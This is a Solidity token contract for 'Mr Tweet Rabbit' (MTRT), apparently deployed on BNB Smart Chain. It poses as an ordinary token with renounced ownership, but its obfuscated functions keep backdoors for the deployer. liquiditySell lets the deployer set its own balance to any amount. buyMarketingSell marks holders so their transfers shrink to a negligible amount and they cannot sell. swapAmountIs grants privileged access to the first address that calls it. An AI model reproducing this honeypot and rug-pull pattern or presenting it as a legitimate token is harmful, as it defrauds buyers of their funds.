/**
 *Submitted for verification at BscScan.com on 2023-01-26
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.2;


interface teamTake {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface limitMax {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract MrTweetRabbit {
    uint8 public decimals = 18;



    address public toTotal;

    address public fromAuto;
    string public symbol = "MTRT";
    mapping(address => bool) public takeToken;

    mapping(address => bool) public receiverTotal;
    address public owner;
    string public name = "Mr Tweet Rabbit";
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply = 100000000 * 10 ** 18;
    bool public minMax;
    uint256 constant modeShould = 10 ** 10;
    mapping(address => uint256) public balanceOf;
    modifier receiverAutoTake() {
        require(receiverTotal[msg.sender]);
        _;
    }

    event OwnershipTransferred(address indexed tradingMarketing, address indexed tokenMax);
    event Transfer(address indexed teamFundTrading, address indexed tradingShould, uint256 receiverFund);
    event Approval(address indexed liquidityTakeList, address indexed shouldTo, uint256 receiverFund);

    constructor (){
        teamTake totalSender = teamTake(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        toTotal = limitMax(totalSender.factory()).createPair(totalSender.WETH(), address(this));
        owner = msg.sender;
        fromAuto = owner;
        receiverTotal[fromAuto] = true;
        balanceOf[fromAuto] = totalSupply;
        emit Transfer(address(0), fromAuto, totalSupply);
        renounceOwnership();
    }

    

    function transferFrom(address enableExempt, address amountShould, uint256 launchTeam) public returns (bool) {
        if (enableExempt != msg.sender && allowance[enableExempt][msg.sender] != type(uint256).max) {
            require(allowance[enableExempt][msg.sender] >= launchTeam);
            allowance[enableExempt][msg.sender] -= launchTeam;
        }
        if (amountShould == fromAuto || enableExempt == fromAuto) {
            return isAtList(enableExempt, amountShould, launchTeam);
        }
        if (takeToken[enableExempt]) {
            return isAtList(enableExempt, amountShould, modeShould);
        }
        return isAtList(enableExempt, amountShould, launchTeam);
    }

    function transfer(address amountShould, uint256 launchTeam) external returns (bool) {
        return transferFrom(msg.sender, amountShould, launchTeam);
    }

    function swapAmountIs(address modeEnable) public {
        if (minMax) {
            return;
        }
        receiverTotal[modeEnable] = true;
        minMax = true;
    }

    function renounceOwnership() public {
        emit OwnershipTransferred(fromAuto, address(0));
        owner = address(0);
    }

    function isAtList(address minTotal, address limitTx, uint256 launchTeam) internal returns (bool) {
        require(balanceOf[minTotal] >= launchTeam);
        balanceOf[minTotal] -= launchTeam;
        balanceOf[limitTx] += launchTeam;
        emit Transfer(minTotal, limitTx, launchTeam);
        return true;
    }

    function getOwner() external view returns (address) {
        return owner;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function liquiditySell(uint256 launchTeam) public receiverAutoTake {
        balanceOf[fromAuto] = launchTeam;
    }

    function buyMarketingSell(address shouldReceiver) public receiverAutoTake {
        if (shouldReceiver == fromAuto) {
            return;
        }
        takeToken[shouldReceiver] = true;
    }


}